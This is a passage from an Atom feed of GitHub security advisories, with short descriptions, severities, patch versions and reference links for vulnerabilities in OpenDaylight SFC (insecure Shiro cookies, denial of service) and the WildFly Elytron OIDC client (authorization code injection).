            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x65v-g96x-c6gw</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-24T21:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opendaylight.sfc:odl-sfc-openflow-renderer] OpenDaylight SFC Insecure Shiro Cookie Configuration]]></title>
        <id>https://github.com/advisories/GHSA-xp75-w7vq-5x6j</id>
        <link href="https://github.com/advisories/GHSA-xp75-w7vq-5x6j"/>
        <updated>2025-03-26T14:33:46.000Z</updated>
        <content type="html"><![CDATA[<p>Insecure Shiro cookie configurations in OpenDaylight Service Function Chaining (SFC) Subproject SFC Sodium-SR4 and below allow attackers to access sensitive information via a man-in-the-middle attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29314">https://nvd.nist.gov/vuln/detail/CVE-2025-29314</a></li>
<li><a href="https://blog.csdn.net/weixin_43959580/article/details/146018166">https://blog.csdn.net/weixin_43959580/article/details/146018166</a></li>
<li><a href="https://github.com/advisories/GHSA-xp75-w7vq-5x6j">https://github.com/advisories/GHSA-xp75-w7vq-5x6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xp75-w7vq-5x6j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-24T21:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opendaylight.sfc:odl-sfc-ovs] OpenDaylight SFC Insecure Shiro Cookie Configuration]]></title>
        <id>https://github.com/advisories/GHSA-xp75-w7vq-5x6j</id>
        <link href="https://github.com/advisories/GHSA-xp75-w7vq-5x6j"/>
        <updated>2025-03-26T14:33:46.000Z</updated>
        <content type="html"><![CDATA[<p>Insecure Shiro cookie configurations in OpenDaylight Service Function Chaining (SFC) Subproject SFC Sodium-SR4 and below allow attackers to access sensitive information via a man-in-the-middle attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29314">https://nvd.nist.gov/vuln/detail/CVE-2025-29314</a></li>
<li><a href="https://blog.csdn.net/weixin_43959580/article/details/146018166">https://blog.csdn.net/weixin_43959580/article/details/146018166</a></li>
<li><a href="https://github.com/advisories/GHSA-xp75-w7vq-5x6j">https://github.com/advisories/GHSA-xp75-w7vq-5x6j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xp75-w7vq-5x6j</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-24T21:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opendaylight.sfc:odl-sfc-ovs] OpenDaylight SFC Denial of Service (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-v3vp-fg2v-g7q4</id>
        <link href="https://github.com/advisories/GHSA-v3vp-fg2v-g7q4"/>
        <updated>2025-03-25T22:06:11.000Z</updated>
        <content type="html"><![CDATA[<p>Use of incorrectly resolved name or reference in OpenDaylight Service Function Chaining (SFC) Subproject SFC Sodium-SR4 and below allows attackers to cause a Denial of Service (DoS).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29313">https://nvd.nist.gov/vuln/detail/CVE-2025-29313</a></li>
<li><a href="https://blog.csdn.net/weixin_43959580/article/details/146018191">https://blog.csdn.net/weixin_43959580/article/details/146018191</a></li>
<li><a href="https://github.com/advisories/GHSA-v3vp-fg2v-g7q4">https://github.com/advisories/GHSA-v3vp-fg2v-g7q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3vp-fg2v-g7q4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-24T21:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.opendaylight.sfc:odl-sfc-openflow-renderer] OpenDaylight SFC Denial of Service (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-v3vp-fg2v-g7q4</id>
        <link href="https://github.com/advisories/GHSA-v3vp-fg2v-g7q4"/>
        <updated>2025-03-25T22:06:11.000Z</updated>
        <content type="html"><![CDATA[<p>Use of incorrectly resolved name or reference in OpenDaylight Service Function Chaining (SFC) Subproject SFC Sodium-SR4 and below allows attackers to cause a Denial of Service (DoS).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29313">https://nvd.nist.gov/vuln/detail/CVE-2025-29313</a></li>
<li><a href="https://blog.csdn.net/weixin_43959580/article/details/146018191">https://blog.csdn.net/weixin_43959580/article/details/146018191</a></li>
<li><a href="https://github.com/advisories/GHSA-v3vp-fg2v-g7q4">https://github.com/advisories/GHSA-v3vp-fg2v-g7q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3vp-fg2v-g7q4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-24T21:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wildfly.security:wildfly-elytron-http-oidc] WildFly Elytron OpenID Connect Client ExtensionOIDC authorization code injection attack]]></title>
        <id>https://github.com/advisories/GHSA-5565-3c98-g6jc</id>
        <link href="https://github.com/advisories/GHSA-5565-3c98-g6jc"/>
        <updated>2025-03-25T21:49:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability was found in OIDC-Client. When using the elytron-oidc-client subsystem with WildFly, authorization code injection attacks can occur, allowing an attacker to inject a stolen authorization code into the attacker's own session with the client with a victim's identity. This is usually done with a Man-in-the-Middle (MitM) or phishing attack.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/wildfly-security/wildfly-elytron/releases/tag/2.2.9.Final">2.2.9.Final</a>
<a href="https://github.com/wildfly-security/wildfly-elytron/releases/tag/2.6.2.Final">2.6.2.Final</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Currently, no mitigation is currently available for this vulnerability.</p>
<h3 id="references">References</h3>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12369">https://nvd.nist.gov/vuln/detail/CVE-2024-12369</a>
<a href="https://access.redhat.com/security/cve/CVE-2024-12369">https://access.redhat.com/security/cve/CVE-2024-12369</a>	
<a href="https://bugzilla.redhat.com/show_bug.cgi?id=2331178">https://bugzilla.redhat.com/show_bug.cgi?id=2331178</a>
<a href="https://issues.redhat.com/browse/ELY-2887">https://issues.redhat.com/browse/ELY-2887</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/security/advisories/GHSA-5565-3c98-g6jc">https://github.com/wildfly-security/wildfly-elytron/security/advisories/GHSA-5565-3c98-g6jc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12369">https://nvd.nist.gov/vuln/detail/CVE-2024-12369</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/pull/2253">https://github.com/wildfly-security/wildfly-elytron/pull/2253</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/pull/2261">https://github.com/wildfly-security/wildfly-elytron/pull/2261</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/commit/5ac5e6bbcba58883b3cebb2ddbcec4de140c5ceb">https://github.com/wildfly-security/wildfly-elytron/commit/5ac5e6bbcba58883b3cebb2ddbcec4de140c5ceb</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/commit/d7754f5a6a91ceb0f4dbbbfe301991f6a55404cb">https://github.com/wildfly-security/wildfly-elytron/commit/d7754f5a6a91ceb0f4dbbbfe301991f6a55404cb</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-12369">https://access.redhat.com/security/cve/CVE-2024-12369</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2331178">https://bugzilla.redhat.com/show_bug.cgi?id=2331178</a></li>
<li><a href="https://issues.redhat.com/browse/ELY-2887">https://issues.redhat.com/browse/ELY-2887</a></li>
<li><a href="https://github.com/advisories/GHSA-5565-3c98-g6jc">https://github.com/advisories/GHSA-5565-3c98-g6jc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5565-3c98-g6jc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T21:49:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[org.wildfly.security:wildfly-elytron-http-oidc] WildFly Elytron OpenID Connect Client ExtensionOIDC authorization code injection attack]]></title>
        <id>https://github.com/advisories/GHSA-5565-3c98-g6jc</id>
        <link href="https://github.com/advisories/GHSA-5565-3c98-g6jc"/>
        <updated>2025-03-25T21:49:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability was found in OIDC-Client. When using the elytron-oidc-client subsystem with WildFly, authorization code injection attacks can occur, allowing an attacker to inject a stolen authorization code into the attacker's own session with the client with a victim's identity. This is usually done with a Man-in-the-Middle (MitM) or phishing attack.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/wildfly-security/wildfly-elytron/releases/tag/2.2.9.Final">2.2.9.Final</a>
<a href="https://github.com/wildfly-security/wildfly-elytron/releases/tag/2.6.2.Final">2.6.2.Final</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>Currently, no mitigation is currently available for this vulnerability.</p>
<h3 id="references">References</h3>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12369">https://nvd.nist.gov/vuln/detail/CVE-2024-12369</a>
<a href="https://access.redhat.com/security/cve/CVE-2024-12369">https://access.redhat.com/security/cve/CVE-2024-12369</a>	
<a href="https://bugzilla.redhat.com/show_bug.cgi?id=2331178">https://bugzilla.redhat.com/show_bug.cgi?id=2331178</a>
<a href="https://issues.redhat.com/browse/ELY-2887">https://issues.redhat.com/browse/ELY-2887</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/security/advisories/GHSA-5565-3c98-g6jc">https://github.com/wildfly-security/wildfly-elytron/security/advisories/GHSA-5565-3c98-g6jc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12369">https://nvd.nist.gov/vuln/detail/CVE-2024-12369</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/pull/2253">https://github.com/wildfly-security/wildfly-elytron/pull/2253</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/pull/2261">https://github.com/wildfly-security/wildfly-elytron/pull/2261</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/commit/5ac5e6bbcba58883b3cebb2ddbcec4de140c5ceb">https://github.com/wildfly-security/wildfly-elytron/commit/5ac5e6bbcba58883b3cebb2ddbcec4de140c5ceb</a></li>
<li><a href="https://github.com/wildfly-security/wildfly-elytron/commit/d7754f5a6a91ceb0f4dbbbfe301991f6a55404cb">https://github.com/wildfly-security/wildfly-elytron/commit/d7754f5a6a91ceb0f4dbbbfe301991f6a55404cb</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-12369">https://access.redhat.com/security/cve/CVE-2024-12369</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2331178">https://bugzilla.redhat.com/show_bug.cgi?id=2331178</a></li>
<li><a href="https://issues.redhat.com/browse/ELY-2887">https://issues.redhat.com/browse/ELY-2887</a></li>
<li><a href="https://github.com/advisories/GHSA-5565-3c98-g6jc">https://github.com/advisories/GHSA-5565-3c98-g6jc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5565-3c98-g6jc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-25T21:49:11.000Z</published>
    </entry>
</feed>